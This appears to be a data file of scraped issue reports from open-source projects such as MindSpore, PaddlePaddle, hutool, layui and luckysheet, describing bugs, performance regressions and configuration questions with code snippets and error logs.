"h5端屏幕旋转后部分浏览器未及时更新宽高,（即还是旋转之前的宽高）导致获取组件宽高异常","h5端屏幕旋转后部分浏览器未及时更新宽高,（即还是旋转之前的宽高）导致获取组件宽高异常 （ipad，或其他平板） 旋转屏幕 建议修改 在 qiun-data-charts.vue文件下 搜索uni.onWindowResize 然后修改uni.onWindowResize中的setTimeout(),给h5单独加一个延迟   <code>: let time = 200; // #ifdef H5 time = 700; // #endif setTimeout(() =&gt; { if (this.echarts) { this.echartsResize = !this.echartsResize; } else { this.resizeHandler(); } }, time);"
[MS][1.6.1][GPU]使用StandardNormal产生大规模随机数耗时严重,"虽然在这个ISSUE中修复了随机数问题。但我测试，只有1.5.2版本速度有提升，1.6.0和1.6.1的随机数生成，即速度很慢。 / 硬件环境: /device gpu : -- MindSpore version :1.6.1 -- Python version : 3.9 -- OS platform and distribution :Ubuntu 16.04 (/): /mode graph 类似下面的速度测试。是不是我这样写法，没办法充分利用图模式？ 我用同样的随机数大小测试了一下tf。tf在第一次调用tf.random.normal时速度与1.5.2的速度几乎相差不大，比如都是1.5秒。对于TF来说，同样的一个程序，第二次使用tf.random.normal。TF的速度会变小很多，比如TF为0.0008秒。而mindspore为0.112秒。（TF图构建好了，第二次速度很快？） 速度提升，同一进程，第二次之后执行应该有巨大速度提升。 在titan rtx GPU上的运行结果： mindspore 1.6.1 176秒。1.5.2 2.03秒 。no-xla 第一次 11.84秒，第二次0.0008秒。 xla 第一次 1.27秒，第二次 0.0008秒。   <code>: ops.normal() import argparse import time import numpy as np import mindspore from mindspore import Tensor import mindspore.ops as P from mindspore import context def normal(output_shape): samples = P.normal(shape=output_shape, mean=Tensor(0.0, mindspore.float32), stddev=Tensor(1.0, mindspore.float32), seed=1234) return None if __name__ == '__main__': parser = argparse.ArgumentParser(description='test normal performance') parser.add_argument('--device_target', type=str, default='GPU', help='set which type of device you want to use. Ascend/GPU') parser.add_argument('--device_id', default=0, type=int, help='device id is for physical devices') args = parser.parse_args() context.set_context(device_target=args.device_target, device_id=args.device_id, mode=context.GRAPH_MODE, save_graphs=False, enable_graph_kernel=True) start_ts = time.time() normal((10000000, 2)) end_ts = time.time() print(f""#1 {end_ts - start_ts}"") start_ts = time.time() normal((10000000, 2)) end_ts = time.time() print(f""#2 {end_ts - start_ts}"") ops.normal() tf.random.normal"
spring-ui 后台配置文件个性化配置的数据页面中没有被渲染出来 3.0.3 版本,不对勿喷   <code>: &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.3&lt;/version&gt; &lt;/dependency&gt;
 onCheck和onUncheck不起作用,"希望勾选及取消复选框后，可以实时显示选中的行数，但是 onCheck和onUncheck不起作用。帮忙查看下，谢谢 }   <code>: function onUncheck(row, $element) { console.info(row) checkRows = checkRows-1; checkRowsRefresh(); }"
【众智】【计算-GPU开发】Qr,Qr 计算一个或多个矩阵的Qr分解。 x q r full_matrices Bool 属性 对应底层算子 对应底层算子Qr: 反向依赖：MatrixTriangularSolve、MatMul、Cast   <code>: class Qr(Primitive):
CamelCaseMap不能被序列化,"JDK版本： jdk1.8.0_131 hutool版本： 5.8.8 cn.hutool.core.map.CamelCaseMap$$Lambda$101/1153405328 does not implement Serializable or externalizable   <code>: CamelCaseMap cm=new CamelCaseMap&lt;&gt;(); cm.put(""CamelCaseMap_b1"", ""CamelCaseMap_b1""); FSTObjectOutput fstOut = null; try { ByteArrayOutputStream bytesOut = new ByteArrayOutputStream(); fstOut = new FSTObjectOutput(bytesOut); fstOut.writeObject(cm); fstOut.flush(); //return bytesOut.toByteArray(); } catch (Exception e) { throw new RuntimeException(e); } finally { if(fstOut != null) { try { fstOut.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } }"
【众智】【计算-GPU开发】TruncatedNormal,"返回指定形状的张量，其中填满符合正态分布的值。并且大小大于平均值两个标准差的的值将被放弃并重新挑选。 接口参考库上： https://www.mindspore.cn/docs/api/zh-CN/r1.6/api_python/mindspore.common.initializer.html?highlight=truncatednormal#mindspore.common.initializer.TruncatedNormal seed int 属性 seed int 属性 dtype mindspore.dtype 属性 shape y 对应底层算子 Classify Name Type Type Range Required INPUT shape int32, int64 TRUE OUTPUT y float16, float32, double TRUE ATTR seed int TRUE ATTR seed2 int TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/TruncatedNormal 3. 异常处理 4. 算子反向 无反向算子   <code>: class TruncatedNormal(PrimitiveWithInfer):"
训练错误信息 Aborted at 1632644219 (unix time) try date -d @1632644219,"PaddlePaddle版本：paddlepaddle-gpu==1.8.5.post107 GPU：Tesla T4 Driver Version: 418.211 CUDA Version: 10.1 cuDNN version: 8.0.5 python version: 3.6.8 (GCC 4.8.5) CentOS Linux release 7.9.2009 (Core) 但是通过执行summary_env.py获取以上信息。 [root@ecs-baidu-x-gpu-test Downloads]# python3 summary_env.py TensorRT dynamic library (libnvinfer.so) that Paddle depends on is not configured correctly. (error code is libnvinfer.so: cannot open shared object file: No such file or directory) Suggestions: Check if TensorRT is installed correctly and its version is matched with paddlepaddle you installed. Configure TensorRT dynamic library environment variables as follows: Linux: set LD_LIBRARY_PATH by Windows: set PATH by `set PATH=XXX;**************************************** Paddle version: 1.8.5 Paddle With CUDA: True OS: CentOS Linux 7 Python version: 3.6.8 CUDA version: 10.1.168 cuDNN version: None.None.None Nvidia driver version: 418.211.00 训练信息 1）单机，T4 单卡，云服务器8核16G 2）显存信息：16G 复现信息：https://github.com/terminator314/mask_recognition 问题描述：代码在jupyter运行。调用CPU时模型可正常在静态图模式下训练，调用GPU进行静态图模式训练时jupyter内核会挂掉，操作系统报一个’检测到python3-3.6.8-18.el17软件包的一个问题‘。 具体报错信息： W0926 16:16:56.865593 10933 device_context.cc:260] device: 0, cuDNN Version: 8.0. W0926 16:16:59.773133 10933 init.cc:226] Warning: PaddlePaddle catches a failure signal, it may not work properly W0926 16:16:59.773157 10933 init.cc:228] You could check whether you killed PaddlePaddle thread/process accidentally or report the case to PaddlePaddle W0926 16:16:59.773160 10933 init.cc:231] The detail failure signal is: W0926 16:16:59.773165 10933 init.cc:234] *** Aborted at 1632644219 (unix time) try ""date -d @1632644219"" if you are using GNU date *** W0926 16:16:59.774632 10933 init.cc:234] PC: @ 0x0 (unknown) W0926 16:16:59.774744 10933 init.cc:234] *** SIGSEGV (@0x0) received by PID 10933 (TID 0x7f5ce6b3f740) from PID 0; stack trace: *** W0926 16:16:59.776057 10933 init.cc:234] @ 0x7f5ce6208630 (unknown) W0926 16:16:59.777312 10933 init.cc:234] @ 0x0 (unknown) [I 16:18:42.495 NotebookApp] Saving file at /x_program/program_6/xcv_lab6.ipynb [I 16:23:41.826 NotebookApp] Kernel interrupted: 8a085c39-91e4-4f0a-a7b0-39001f15c252   <code>: export LD_LIBRARY_PATH=..."
搜索体验优化——支持模糊搜索,"RFC Use this template for the new feature or enhancement kind/feature or kind/enhancement Background 当前官网的搜索体验不佳。如：搜索“数据处‘里’”,由于“里”是错别组，不会搜索出相应的结果。 Introduction 优化搜索体验，提供模糊搜索的能力 Trail No. Task Description Related Issue(URL) 1 2   <code>: about labels"
paddle v2 python api 存在问题,"ipython这个工具可以查看一个类的接口，以及接口的代码。个人感觉，有时候用ipython查看比查看文档方便的多，不过用ipython 查看paddle代码时候，存在一些问题， for example： 当我查看fc layer的实现的时候， 出现了这个代码，个人认为不是很友好，希望在new paddle中避免这种问题   <code>: In [1]: import paddle.v2 as paddle pa In [2]: paddle.layer.fc?? Signature: paddle.layer.fc(*args, **xargs) Source: def wrapped(*args, **xargs): out = f(*args, **xargs) outs = out if not isinstance(out, collections.Sequence): outs = [out] for l in outs: if isinstance(l, conf_helps.LayerOutput): __layer_map__[l.full_name] = l return out File: ~/.jumbo/lib/python2.7/site-packages/paddle/v2/config_base.py Type: function"
layui.table不支持已知数据的分页，求帮助是否有对应的写法,"这是我目前的写法，用了一个独立的分页控件，问： 能否使用page:true的办法，在里面把 limit: config.limit, //limits: [10, 20, 30, 40, 50], jump: function (pager, first) { if (!first) { mainTable.reload({ page: pager.curr, limit: pager.limit }); } } 绑定到layui.table里面去，不用2个控件跑   <code>: table.reload(""mainList"", { limit: config.limit, data: json.data.list }); layui.laypage.render({ elem: 'pager', count: json.data.total, curr: config.page, layout: ['count', 'prev', 'page', 'next', 'limit', 'refresh', 'skip'], limit: config.limit, //limits: [10, 20, 30, 40, 50], jump: function (pager, first) { if (!first) { mainTable.reload({ page: pager.curr, limit: pager.limit }); } } });"
Build default use cmake release,"Fix https://github.com/PaddlePaddle/Paddle/issues/1667 Add when build docker image, this will significantly reduce the size of the binaries.   <code>: -DCMAKE_BUILD_TYPE=Release"
[BUG][MD][FUNC][OP]KITTIDataset: The type of label and occluded is incorrect.,: /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_func_kitti_dataset.cc 1.执行TestKITTITrainDatasetGetters 2.查看错误和打印信息是否与datasets.py注解中的一致 KITTI Dataset当usage为train时，Tensor返回的列名label、occluded的数据类型（int32/uint64）与datasets.py注解中的( is of the uint32 type； is of the uint32 type.)不一致； KITTI Dataset当usage为train时，Tensor返回的列名label、occluded的数据类型都为uint32； bash tests/ut/cpp/runtest.sh DataSetKITTITest.TestKITTITrainDatasetGetters   <code>: label occluded
RNN search inference,"Hi, We need to benchmark inference for RNN search. In benchmark/fluid/machine_translation.py I found that there is no inference_only path: And the with_test switch seems to add a test phase but it does not output any accuracy. Do you plan to add inference? @dzhwinter, maybe you could help?   <code>: def infer(): pass"
项目运行报错了，请帮忙看看是什么问题,"环境信息 pigx版本: 3.9 Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-09-10 20:43:03.895 ERROR 4668 --- [ main] o.s.b.d.LoggingFailureA nalysisReporter : APPLICATION FAILED TO START Description: Failed to bind properties under 'security.oauth2.client.client-id' to java.lang. String: ateKeyString', 'jasypt.encryptor.privateKeyLocation'] must be provided for Passw ord-based or Asymmetric encryption   <code>: Reason: either 'jasypt.encryptor.password' or one of ['jasypt.encryptor.priv"
resize_nearest与tensorflow.image.resize_nearest_neighbor差异,"两个接口的定义分别为 测试中发现，同样的输入，只有在tensorflow接口里align_corners=True的前提下，输出才无diff 请问是否有方法，在align_corners=False的情况下，使PaddlePaddle和Tensorflow得到同样的输出结果呢   <code>: paddle.fluid.layers.resize_nearest(input, out_shape=None, scale=None, name=None, actual_shape=None) tensorflow.image.resize_nearest_neighbor( images, size, align_corners=False, name=None)"
调整device target设置逻辑,"原来的 编包时生成文件，定义如的支持列表，会在时读取，查看是否在这个列表中，如果不在，就报错，如果在，就通过pybind11调用c++接口进行设置。 如果用户没有显式设置device target，在里通过等编译宏指定CPU/GPU/Ascend的默认device target。 修改后 定义一种设置device context与policy的函数，各plugin实现该函数并注册给，改为懒汉式实现，第一次new的时候会去注册map中查看当前已有哪些注册： 如果没有CPU，意味着是ut等场景，什么都不做 如果有CPU 2.1 如果总size只有1，说明只有CPU，默认选择CPU 2.2 如果总size为2，说明除了CPU外还有一个别的，选除CPU之外的另一个 2.3 如果总size大于2，说明注册了很多可用的插件，选谁都不好，不如只选CPU 如果用户显式设置，不再在python侧做判断，直接调用pybind11的，在这个c++函数里会读取map，检查用户设置的合法性。 默认device target对比 <th align=""left"">安装包 <th align=""left"">原来 <th align=""left"">现在 <td align=""left"">ascend <td align=""left"">target: ascend <td align=""left"">target: ascend <td align=""left""> <td align=""left"">policy: ge or ms (by env) <td align=""left"">policy: ge or ms (by env) <td align=""left"">gpu <td align=""left"">target: gpu <td align=""left"">target: gpu <td align=""left""> <td align=""left"">policy: ms <td align=""left"">policy: ms <td align=""left"">cpu <td align=""left"">target: cpu <td align=""left"">target: cpu <td align=""left""> <td align=""left"">policy: ms <td align=""left"">policy: ms <td align=""left"">ascend + gpu <td align=""left"">没有 <td align=""left"">target: cpu <td align=""left""> <td align=""left""> <td align=""left"">policy: ms <td align=""left"">ut <td align=""left"">target: - <td align=""left"">target: - <td align=""left""> <td align=""left"">policy: vm <td align=""left"">policy: vm   <code>: default_config.py __device_target__ = 'ascend or cpu' context.py set_context(device_target=""XXXX"") default_config.py ""XXXX"" MsContext::set_param&lt;T&gt;() context_extends.cc ENABLE_D class MS_CORE_API MsContext { public: using InitDeviceTargetAndPolicy = void (*)(MsContext *); static std::shared_ptr&lt;MsContext&gt; GetInstance(); static void RegisterInitFunc(const std::string &amp;name, InitDeviceTargetAndPolicy func) { init_func_map_.emplace(name, func); } ... } #define MSCONTEXT_REGISTER_INIT_FUNC(name, func) \ class name##InitFuncRegister { \ public: \ name##InitFuncRegister() { MsContext::RegisterInitFunc(name, func); } \ } g_##name##_init_func_register; MsContext MsContext::GetInstance set_context(device_target=""XXXX"") MsContext::set_param&lt;T&gt;()"
[ST][MS][Pynative]函数式编程 feed 模式下 pynative resnet50 ascend 8p 训练失败 ,"函数式编程 feed 模式下 pynative resnet50 ascend 8p 出现空指针报错 / 硬件环境: /device ascend : -- MindSpore version :commit_id = '[sha1]:46b5eda2,[branch]:(HEAD,origin/master,origin/HEAD,master)' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_ms_functional_cell_mixed_programming_mixed_precision_001.py cd solution_test/cases/01frame_func/17cell_function_coding/mixed_precision/ pytest -s test_ms_functional_cell_mixed_programming_mixed_precision_001.py 训练正常，精度达标 责任人 蔡凯睿   <code>: [INFO] DEBUG(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.390 [mindspore/ccsrc/debug/debugger/debugger.cc:299] Reset] Release Debugger resource. [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.405 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1861] ClearResPart3] Start clear ClearObjectCache... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.418 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1863] ClearResPart3] End clear ClearObjectCache... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.431 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1865] ClearResPart3] Start clear Parser... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.443 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1867] ClearResPart3] End clear Parser... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.456 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1869] ClearResPart3] Start ClearTraceStack... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.468 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1871] ClearResPart3] End ClearTraceStack... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.480 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1873] ClearResPart3] Start clear InterpretNodeRecorder... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.493 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1875] ClearResPart3] End clear InterpretNodeRecorder... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.505 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1877] ClearResPart3] Start clear parallel::entire_costgraph... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.522 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1879] ClearResPart3] End clear parallel::entire_costgraph... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.534 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1881] ClearResPart3] Start clear ProtobufLibrary... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.680 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1883] ClearResPart3] End clear ProtobufLibrary... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.697 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1887] ClearSingleton] Start clear singleton... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.780 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1901] ClearSingleton] End clear singleton. [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.795 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1910] ClearResAtexit] Start unload dynamic lib... [INFO] PIPELINE(138633,ffffb4b2a010,python):2023-01-04-16:23:17.282.825 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1912] ClearResAtexit] End unload dynamic lib... Traceback (most recent call last): File ""train_functional_feed.py"", line 392, in &lt;module&gt; train_net() File ""train_functional_feed.py"", line 330, in train_net loss = train_step(data, label) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 578, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 101, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 312, in __call__ output = self._graph_executor(tuple(new_inputs), phase) RuntimeError: The pointer[build_info] is null. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/backend/common/session/anf_runtime_algorithm.cc:340 GetOutputFormat [INFO] KERNEL(138633,ffffb4b2a010,python):2023-01-04-16:23:17.902.452 [mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_kernel_compile.cc:1003] TbeFinalize] TbeFinalize start. [INFO] KERNEL(138633,ffffb4b2a010,python):2023-01-04-16:23:17.902.521 [mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_kernel_compile.cc:1012] TbeFinalize] TbeFinalize end. [INFO] ME(139103:281473749565456,MainProcess):2023-01-04-16:23:18.450.634 [mindspore/_extends/remote/kernel_build_server_ascend.py:65] [TRACE] Ascend Messager Exit... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.355 [mindspore/ccsrc/pipeline/jit/init.cc:432] operator()] Start releasing dataset handles... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.429 [mindspore/ccsrc/pipeline/jit/init.cc:435] operator()] End release dataset handles. [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.468 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1905] ClearResAtexit] Pipeline clear all resource [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.591 [mindspore/ccsrc/pipeline/jit/pipeline.cc:260] RecordExitStatus] Status record: system exit. [INFO] DEBUG(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.624 [mindspore/ccsrc/common/debug/env_config_parser.cc:153] ParseFromFile] The 'env_config_path' in 'mindspore.context.set_context(env_config_path={path})' is empty. [INFO] DEBUG(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.640 [mindspore/ccsrc/common/debug/rdr/recorder_manager.cc:138] ClearAll] RDR clear all recorders. [INFO] ME(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.705 [mindspore/core/mindrt/src/actor/actormgr.cc:150] Finalize] mindrt Actors finish exiting. [INFO] ME(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.720 [mindspore/core/mindrt/src/actor/actormgr.cc:153] Finalize] mindrt Threads finish exiting. [INFO] ME(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.733 [mindspore/core/mindrt/src/actor/actormgr.cc:164] Finalize] mindrt IOMGRS finish exiting. [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.759 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1787] ClearResPart1] Start clear kernel runtime... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.781 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1789] ClearResPart1] End clear kernel runtime. [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.793 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1791] ClearResPart1] Start Finalize StreamSynchronizer... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.452.810 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1793] ClearResPart1] End Finalize StreamSynchronizer... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.453.811 [mindspore/ccsrc/pipeline/jit/pipeline.cc:652] ClearRes] Clean executor resource! [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.453.847 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1808] ClearResPart2] Start clear PyNativeExecutor... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.453.903 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1810] ClearResPart2] End clear PyNativeExecutor. [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.453.926 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1822] ClearResPart2] Start clear ConfigManager... [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.453.940 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1824] ClearResPart2] End clear ConfigManager. [INFO] PIPELINE(139103,ffffb6db4010,python):2023-01-04-16:23:18.453.953 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1831] ClearResPart2] Start clear device context..."
Run-time error when parsing a simple test case,"Run-time error when parsing a simple test case : /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : When trying to parse this test case: the parser segfaults with the error message: The expected result is ""28"". Create a python script with the above code Test the script with The problem doesn't appear for VM back-end   <code>: import pytest from mindspore._c_expression import typing from mindspore.common.api import ms_function import mindspore.context as context def setup_module(module): context.set_context(mode=context.GRAPH_MODE) @ms_function def try_simple_01(x, y): if (y &lt; 3 * x): return x out = 0 for z in range(8): out = out + z return out def test_simple_01(): x = 1 y = 5 print(try_simple_01(x, y)) E RuntimeError: mindspore/ccsrc/optimizer/irpass/branch_culling.cc:114 RunSwitchNodeReplace] TransformGraphDependNode replace node failed original:25_22_19_13_7_try_simple_01:[CNode]0{[0]: ValueNode&lt;Primitive&gt; return, [1]: x} to new: 25_22_19_13_7_try_simple_01:[CNode]1{[0]: ValueNode&lt;Primitive&gt; return, [1]: [CNode]2} ../mindspore/common/api.py:171: RuntimeError pytest -s &lt;filename.py&gt;"
MapUtil遇到中文字符串时会报类型转换异常,"JDK版本： openjdk_8_201 hutool版本： 5.4.2 在使用org.apache.commons.collections.MapUtils和org.apache.commons.collections4.MapUtils时就不会报这个错误，希望作者可以考虑下像collections一样捕获这个异常并记录在日志，或者做个开关选择是否捕获这个异常   <code>: String str = ""number""; Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(); map.put(""int"",str); //System.out.println(MapUtil.getInt(map, ""int"", 0)); System.out.println(MapUtils.getInteger(map, ""int""));"
【代码生成】使用LocalDate类型，发现包路径描述错误 （java.times 》》java.time）[3.6.4-RELEASE],"依赖版本 3.6.4-RELEASE 类：org.beetl.sql.gen.SourceConfig 第168、171行 java.times.LocalDateTime 、java.times.LocalDate 应该为：java.time.LocalDateTime 、java.time.LocalDate   <code>: protected String getJavaType(ColDesc desc, PackageList packageList) { int jdbcType = desc.getSqlType(); if (JavaType.isDateType(jdbcType)) { if (this.preferDateType == SourceConfig.PreferDateType.Date) { packageList.getPkgs().add(""java.util.Date""); return ""Date""; } else if (this.preferDateType == SourceConfig.PreferDateType.LocalDate) { boolean isTime = JavaType.isDateTimeType(jdbcType); if (isTime) { packageList.getPkgs().add(""java.times.LocalDateTime""); return ""LocalDateTime""; } else { packageList.getPkgs().add(""java.times.LocalDate""); return ""LocalDate""; } } else { packageList.getPkgs().add(""java.sql.Timestamp""); return ""Timestamp""; } } else { String type = JavaType.getType(desc.getSqlType(), desc.getSize(), desc.getDigit()); if (this.preferDoubleType == SourceConfig.PreferDoubleType.BigDecimal &amp;&amp; type.equals(""Double"")) { packageList.getPkgs().add(""java.math.BigDecimal""); type = ""BigDecimal""; } return type; } }"
schema 定义覆盖问题,knife4j-spring-boot-starter v3.0.3 发现两个内部类因为同名，导致的定义覆盖问题。   <code>: 请求参数 schema
mac下安装cpu版本，安装成功，运行失败,"建立issue时，为快速解决问题，请您根据使用情况给出如下信息： 1）PaddlePaddle版本：1.5.2 2）系统环境：MacBook Pro (Retina, 13-inch, Early 2015) 安装方式信息： 1）pip安装   <code>: Python 3.7.3 (default, Mar 27 2019, 16:54:48) [Clang 4.0.1 (tags/RELEASE_401/final)] :: Anaconda, Inc. on darwin Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. &gt;&gt;&gt; import paddle.fuild Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/paddle/__init__.py"", line 25, in &lt;module&gt; import paddle.dataset File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/paddle/dataset/__init__.py"", line 28, in &lt;module&gt; import paddle.dataset.mq2007 File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/paddle/dataset/mq2007.py"", line 30, in &lt;module&gt; import rarfile File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/rarfile.py"", line 2950, in &lt;module&gt; _check_unrar_tool() File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/rarfile.py"", line 2931, in _check_unrar_tool custom_check([ORIG_UNRAR_TOOL], True) File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/rarfile.py"", line 2823, in custom_check p = custom_popen(cmd) File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/site-packages/rarfile.py"", line 2813, in custom_popen creationflags=creationflags) File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/subprocess.py"", line 775, in __init__ restore_signals, start_new_session) File ""/Users/xx/anaconda3/envs/py3env/lib/python3.7/subprocess.py"", line 1522, in _execute_child raise child_exception_type(errno_num, err_msg, err_filename) NotADirectoryError: [Errno 20] Not a directory: 'unrar'"
[CT][MS][SparseDenseCwiseDiv] The document and error message of SparseDenseCwiseDiv need modify.,"The document of SparseDenseCwiseDiv need modify 代码中的API资料需要修改： 缺少约束说明，需要添加进inputs中： 输入x1_shape必须和输入x2的shape相同或者支持广播 API资料中的样例跑不通，详见重现步骤 / 硬件环境: /device ascend/CPU/ : -- MindSpore version : -- Python version : Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph pytest -vra --doctest-modules -o doctest_optionflags=NORMALIZE_WHITESPACE --tb=long sparse_ops.py::mindspore.ops.operations.sparse_ops.SparseDenseCwiseDiv   <code>: = ____________________________________________________________ [doctest] mindspore.ops.operations.sparse_ops.SparseDenseCwiseDiv ____________________________________________________________ 218 219 Supported Platforms: 220 ``Ascend`` ``CPU`` 221 222 Examples: 223 &gt;&gt;&gt; x1_indices = Tensor([[0, 0], [2, 2]], dtype=ms.int64) 224 &gt;&gt;&gt; x1_values = Tensor([4, 2], dtype=ms.int32) 225 &gt;&gt;&gt; x1_shape = Tensor([3, 3], dtype=ms.int64) 226 &gt;&gt;&gt; x2=Tensor([1,2,2],dtype=ms.int32) 227 &gt;&gt;&gt; y = sparse_dense_cwise_div(x1_indices, x1_values, x1_shape, x2) UNEXPECTED EXCEPTION: NameError(""name 'sparse_dense_cwise_div' is not defined"") Traceback (most recent call last): File ""/root/miniconda3/envs/zhujunan2/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.operations.sparse_ops.SparseDenseCwiseDiv[4]&gt;"", line 1, in &lt;module&gt; NameError: name 'sparse_dense_cwise_div' is not defined /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/operations/sparse_ops.py:227: UnexpectedException"
luckysheet  按区域进行工作表保护无效,"我的配置如下： sheet=1 时。工作表保护，和区域保护同时有效。sheet=0 时，工作表保护和区域保护。同时失效。allowRangeList 中配置的区域。无法实现按区域进行工作表保护。哪位大佬指点下迷津。目前框架是否支持按区域进行工作表保护。需要怎样配置。   <code>: ""authority"":{ selectLockedCells:1, //选定锁定单元格 selectunLockedCells:1, //选定解除锁定的单元格 formatCells:0, //设置单元格格式 formatColumns:0, //设置列格式 formatRows:0, //设置行格式 insertColumns:0, //插入列 insertRows:0, //插入行 insertHyperlinks:0, //插入超链接 deleteColumns:0, //删除列 deleteRows:0, //删除行 sort:0, //排序 filter:1, //使用自动筛选 usePivotTablereports:0, //使用数据透视表和报表 editObjects:0, //编辑对象 editScenarios:0, //编辑方案 sheet:1, //如果为1或true，则该工作表受到保护；如果为0或false，则该工作表不受保护。 hintText:"""", //弹窗提示的文字 algorithmName:""None"",//加密方案：MD2,MD4,MD5,RIPEMD-128,RIPEMD-160,SHA-1,SHA-256,SHA-384,SHA-512,WHIRLPOOL saltValue:null, //密码解密的盐参数，为一个自己定的随机数值 allowRangeList:[{ //区域保护 name:""area"", //名称 password:""1"", //密码 hintText:"""", //提示文字 algorithmName:""None"",//加密方案：MD2,MD4,MD5,RIPEMD-128,RIPEMD-160,SHA-1,SHA-256,SHA-384,SHA-512,WHIRLPOOL saltValue:null, //密码解密的盐参数，为一个自己定的随机数值 sqref:""Cell!C0:D5"" //区域范围 }], }, //工作表保护"
